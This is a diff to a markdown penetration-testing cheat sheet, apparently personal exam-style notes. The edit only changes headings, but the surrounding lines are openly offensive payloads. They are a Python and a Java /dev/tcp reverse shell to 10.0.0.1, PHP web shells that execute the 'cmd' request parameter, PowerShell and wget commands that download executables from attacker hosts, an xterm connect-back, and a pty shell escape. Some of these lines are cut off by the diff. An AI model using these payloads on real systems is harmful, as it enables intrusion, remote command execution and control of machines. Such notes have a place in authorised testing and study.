@@ -22,12 +22,12 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 -https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
-#### PHP
+# PHP WebShell 
 ```<?php echo shell_exec($_GET['cmd']);?>```
 
 ```<?php system($_GET['cmd']);?>```
 
-#### JAVA
+# JAVA
 ```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line
@@ -35,8 +35,8 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
-#### Powershell
-Powershell 2
+# Powershell
+#### Powershell 2
 ```(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe","C:\lec\accesschk.exe")```
 
 #### Powershell 3
@@ -46,7 +46,7 @@ Powershell 2
 
 ```Wget http://10.11.0.130/test.txt -o C:\temp\test.txt```
 
-#### xterm
+# xterm
 "One of the simplest forms of reverse shell is an xterm session. 
 The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001:
 
@@ -62,7 +62,7 @@ You’ll need to authorise the target to connect to you (command also run on you
 
 ```xhost +targetip```
 
-#### Shell Escape; from Shellcatraz
+# Shell Escape; from Shellcatraz
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 
